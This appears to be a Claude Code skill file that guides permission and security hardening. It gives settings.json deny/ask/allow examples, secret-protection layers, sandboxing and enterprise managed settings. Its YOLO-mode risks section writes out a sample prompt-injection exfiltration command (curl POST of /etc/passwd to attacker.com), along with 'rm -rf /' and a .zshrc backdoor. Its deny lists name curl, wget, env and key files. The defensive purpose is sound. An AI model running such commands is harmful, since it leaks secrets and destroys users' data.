---
name: security-hardening
description: Security and permissions hardening for Claude Code. Configures permission hierarchies, deny/ask/allow rules, secret protection layers, sandboxing, and enterprise managed settings. Includes complete settings.json examples for zero-trust, balanced, and autonomous security postures.
---

# Security and Permissions Hardening

## Purpose

Configure Claude Code's permission system to prevent data exfiltration, accidental secret exposure, and destructive operations. Apply the correct permission hierarchy, write settings.json configurations for different risk profiles, implement multi-layer secret protection, and understand the risks of YOLO mode. Provide enterprise governance patterns for team deployments.

## When to Use

- Setting up Claude Code on a new machine or project
- Working with sensitive codebases that have production credentials
- Configuring permissions for a team or enterprise deployment
- Deciding whether to use YOLO mode (--dangerously-skip-permissions)
- Any time you mention "permissions", "security", "YOLO mode", "lock down", or "sandbox"

## Examples

**Example 1: Hardening a production repo**
```
User: "Lock down Claude Code for our production codebase"
Claude: [Uses security-hardening]
Configures a Zero Trust settings.json that blocks all internet access,
denies reading .env files and SSH keys, asks for all bash commands, and
disables hooks from untrusted repos.
```

**Example 2: Safe autonomous mode**
```
User: "I want to run Claude autonomously for this refactor"
Claude: [Uses security-hardening]
Sets up a Docker container with mounted project directory only. Runs
--dangerously-skip-permissions ONLY inside the container. Explains the
risks and confirms the user is not running on their host machine.
```

## Permission Evaluation Order

When Claude attempts to use a tool, rules are checked in this strict order:

1. **DENY** (highest priority): Action blocked immediately. No prompt shown.
2. **ASK** (medium): Claude pauses and asks for explicit approval.
3. **ALLOW** (lowest): Action executes automatically.

If no rule matches, the default behavior (usually Ask) applies. First match wins.

## Configuration Scopes and Precedence

Settings merge from multiple locations, with earlier entries overriding later ones:

| Priority | Location | Scope |
| :--- | :--- | :--- |
| 1 (highest) | `/etc/claude-code/managed-settings.json` | System-wide (IT-managed, immutable) |
| 2 | Command line flags | Session-specific |
| 3 | `.claude/settings.local.json` | Project, personal (gitignored) |
| 4 | `.claude/settings.json` | Project, shared (committed) |
| 5 (lowest) | `~/.claude/settings.json` | Global personal defaults |

## Posture A: Zero Trust (Paranoid Hardening)

For sensitive proprietary codebases or machines with production access:

```json
{
  "$schema": "https://json.schemastore.org/claude-code-settings.json",
  "permissions": {
    "defaultMode": "ask",
    "deny": [
      "WebFetch",
      "Bash(curl *)",
      "Bash(wget *)",
      "Read(./.env*)",
      "Read(./**/*.pem)",
      "Read(./**/id_rsa)",
      "Task(Explore)"
    ],
    "ask": [
      "Bash(*)"
    ],
    "allow": [
      "Read"
    ]
  },
  "disableAllHooks": true
}
```

## Posture B: Balanced Productivity (Standard Dev)

For daily development where you trust tooling but want to prevent accidents:

```json
{
  "permissions": {
    "defaultMode": "ask",
    "deny": [
      "Read(./.env)",
      "Read(./secrets/**)"
    ],
    "allow": [
      "Read",
      "Write",
      "Bash(ls *)",
      "Bash(git status)",
      "Bash(git diff *)",
      "Bash(npm run lint)"
    ],
    "ask": [
      "Bash(git push *)",
      "Bash(rm *)",
      "WebFetch"
    ]
  }
}
```

## Posture C: Safe Autonomous Mode (Sandboxed)

For heavy refactoring in a contained environment. MUST run inside a Docker container or VM:

```bash
# ONLY run this in an isolated container/VM — NEVER on your host machine
claude --dangerously-skip-permissions
```

**YOLO mode risks:**
- Data exfiltration: A prompt injection could `curl -X POST https://attacker.com -d @/etc/passwd`
- Destruction: Can run `rm -rf /` or delete git history
- Persistence: Can modify `.zshrc` to install backdoors
- Mitigation: ALWAYS use a disposable environment (GitHub Codespaces, Docker)

## Multi-Layer Secret Protection

### Layer 1: Configuration Gates

Add to your global `~/.claude/settings.json`:

```json
"permissions": {
  "deny": [
    "Read(./.env*)",
    "Read(./**/*.key)",
    "Read(./**/*.token)",
    "Bash(env)",
    "Bash(printenv)"
  ]
}
```

### Layer 2: Global CLAUDE.md Gatekeeper

Create `~/.claude/CLAUDE.md`:

```markdown
# Security Rules
- NEVER read or display the contents of .env files.
- NEVER output API keys, passwords, or secrets in plain text.
- NEVER commit sensitive data to git.
- If you need a secret, ask the user to provide it via a secure prompt.
```

### Layer 3: Deterministic Hooks

Hooks are more reliable than prompt instructions. Use a PreToolUse hook to block sensitive file access:

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Read|Edit|Write",
        "hooks": [
          {
            "type": "command",
            "command": "python3 ~/.claude/hooks/block-secrets.py"
          }
        ]
      }
    ]
  }
}
```

The script checks file paths and returns exit code 2 (Block) for matches against sensitive patterns.

### Layer 4: External Tools

- **psst**: Injects secrets at the subprocess level so Claude never sees the key string in context
- **cc-filter**: A Go proxy that sanitizes input/output streams to redact secrets before reaching the model

## Sandboxing Configuration

Built-in sandbox for Bash execution:

```json
{
  "sandbox": {
    "enabled": true,
    "autoAllowBashIfSandboxed": true,
    "network": {
      "allowedDomains": [
        "github.com",
        "registry.npmjs.org",
        "pypi.org"
      ],
      "allowUnixSockets": ["/var/run/docker.sock"]
    },
    "excludedCommands": ["docker"]
  }
}
```

## Enterprise Managed Settings

Deploy to `/etc/claude-code/managed-settings.json` for immutable policies:

- `disableAllHooks`: true (prevents malicious repo hooks from auto-executing)
- `allowManagedHooksOnly`: true (only IT-approved hooks)
- `allowedMcpServers` / `deniedMcpServers`: Whitelist safe MCP servers, block dangerous ones
- `disableBypassPermissionsMode`: "disable" (prevents YOLO mode organization-wide)

**MCP security risk:** An MCP server with filesystem access could be tricked into reading `~/.ssh/id_rsa`. Only allow MCP servers in user scope (`~/.claude.json`), not project scope, to prevent repo-jacking.

## Audit Checklist

1. Run `/permissions` to see active rules
2. Add `.env` and `secrets/*` to the deny list
3. Enable `sandbox.enabled` in settings
4. Implement a PreToolUse hook for sensitive file scanning
5. Ensure `disableBypassPermissionsMode` is set for team environments

## Success Criteria

- [ ] Permission rules follow Deny > Ask > Allow evaluation order
- [ ] Secrets are protected at multiple layers (config, CLAUDE.md, hooks)
- [ ] YOLO mode is only used inside disposable containers
- [ ] Enterprise managed settings are deployed for team environments
- [ ] Sandboxing is enabled with whitelisted network domains

## Copy/Paste Ready

```
"Set up security permissions for this project"
"Configure zero-trust mode for Claude Code"
"Is it safe to use YOLO mode for this refactor?"
"Lock down secret access in Claude Code"
"Deploy enterprise managed settings for the team"
```
